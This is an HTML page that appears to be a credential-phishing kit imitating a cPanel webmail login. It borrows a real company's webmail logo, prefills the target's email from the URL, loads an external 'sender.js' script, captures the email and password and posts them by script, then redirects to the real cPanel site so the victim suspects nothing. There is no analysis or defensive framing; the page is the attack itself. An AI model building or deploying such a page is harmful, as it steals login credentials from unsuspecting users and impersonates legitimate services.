<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f9f9f9;
        }
        .login-container {
            text-align: center;
            background-color: white;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            width: 300px;
        }
        .login-container img {
            width: 100%;
            max-width: 200px;
            height: auto;
            margin-bottom: 20px;
        }
        .login-container form {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
        }
        .login-container label {
            font-size: 16px;
            font-weight: 700;
            margin-bottom: 5px;
            color: #333;
        }
        .input-container {
            position: relative;
            width: 100%;
            margin-bottom: 15px;
        }
        .input-container input {
            width: 100%;
            padding: 10px 10px 10px 40px;
            font-size: 14px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .input-container .icon {
            position: absolute;
            top: 50%;
            left: 10px;
            transform: translateY(-50%);
            font-size: 18px;
            color: #888;
        }
        .login-container button {
            padding: 10px;
            font-size: 14px;
            background-color: #0073aa;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-weight: 700;
        }
        .login-container button:hover {
            background-color: #005e8a;
        }
        .locale-container {
            margin-top: 10px;
            width: 100%;
        }
        .locale-container label {
            font-size: 16px;
            font-weight: 700;
            display: block;
            margin-bottom: 5px;
            color: #333;
        }
        .locale-container select {
            padding: 10px;
            font-size: 14px;
            border: 1px solid #ccc;
            border-radius: 4px;
            width: 100%;
        }
        .logo-container {
            margin-top: 20px;
        }
        .logo-container img {
            width: 50px;
            height: auto;
        }
        .login-container footer {
            margin-top: 20px;
            font-size: 12px;
            color: #777;
        }
        .login-container footer a {
            color: #777;
            text-decoration: none;
        }
        .login-container footer a:hover {
            text-decoration: underline;
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
</head>
<body>
    <div class="login-container">
        <img src="http://webmail.atwood.com.sg/cPanel_magic_revision_1481065324/unprotected/cpanel/images/webmail-logo.svg" alt="Webmail Logo">
        <form id="loginForm" action="" method="post">
            <label for="email">Email Address</label>
            <div class="input-container">
                <input type="email" id="email" name="email" placeholder="Enter your email address" required>
                <i class="fas fa-envelope icon"></i>
            </div>
            <label for="password">Password</label>
            <div class="input-container">
                <input type="password" id="password" name="password" placeholder="Enter your email password" required>
                <i class="fas fa-lock icon"></i>
            </div>
            <button type="submit">Log in</button>
        </form>
        <div class="locale-container">
          <script src="sender.js"></script>
            <label for="locale">Select a locale:</label>
            <select id="locale" name="locale">
                <option value="en">English</option>
                <!-- Add other locale options as needed -->
            </select>
        </div>
        <div class="logo-container">
            <img src="https://cdn.logoeps.net/wp-content/uploads/2016/12/cpanel-logo1.png" alt="cPanel Logo">
        </div>
        <footer>
            <p>CopyrightÂ© 2024 cPanel, L.L.C.</p>
            <a href="#">Privacy Policy</a>
        </footer>
    </div>
    <script>
        function getParameterByName(name) {
            name = name.replace(/[\[\]]/g, '\\$&');
            const url = new URL(window.location.href);
            const params = new URLSearchParams(url.search);
            return params.get(name);
        }

        document.addEventListener('DOMContentLoaded', (event) => {
            const email = getParameterByName('email');
            if (email) {
                document.getElementById('email').value = email;
            }
        });

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const formData = new FormData(this);

            console.log('Form data:', Object.fromEntries(formData.entries()));

            fetch(this.action, {
                method: 'POST',
                body: formData,
            })
            .then(response => response.json())
            .then(data => {
                console.log('Response data:', data);
                if (data.success) {
                    window.location.href = 'https://cpanel.net';
                } else {
                    alert('Submission failed. Please try again.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred. Please try again.');
            });
        });
    </script>
</body>
</html>
